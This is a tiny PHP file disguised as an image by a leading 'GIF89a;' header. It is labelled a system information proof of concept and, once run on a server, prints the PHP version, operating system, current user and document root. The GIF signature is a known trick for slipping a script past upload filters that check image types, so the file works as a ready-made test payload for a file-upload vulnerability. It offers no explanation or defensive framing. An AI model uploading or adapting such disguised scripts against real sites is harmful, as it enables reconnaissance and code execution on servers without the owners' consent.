GIF89a;
<?php
echo "--- SYSTEM INFORMATION POC ---<br>";
echo "PHP Version: " . phpversion() . "<br>";
echo "Server OS: " . PHP_OS . "<br>";
echo "Current User: " . get_current_user() . "<br>";
echo "Document Root: " . $_SERVER['DOCUMENT_ROOT'] . "<br>";
?>
